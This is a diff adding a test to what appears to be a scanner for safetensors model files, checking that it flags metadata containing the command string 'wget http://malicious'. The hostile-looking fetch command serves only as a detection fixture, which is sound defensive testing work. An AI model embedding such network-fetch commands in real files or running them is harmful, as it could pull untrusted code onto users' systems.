@@ -75,3 +75,17 @@ def test_bad_offsets(tmp_path: Path) -> None:
 
     assert result.has_errors
     assert any("offset" in issue.message.lower() for issue in result.issues)
+
+
+def test_suspicious_metadata(tmp_path: Path) -> None:
+    file_path = tmp_path / "model.safetensors"
+    data = {"t": np.arange(5, dtype=np.float32)}
+    metadata = {"info": "wget http://malicious"}
+    save_file(data, str(file_path), metadata=metadata)
+
+    scanner = SafeTensorsScanner()
+    result = scanner.scan(str(file_path))
+
+    assert any(
+        "suspicious metadata" in issue.message.lower() for issue in result.issues
+    )
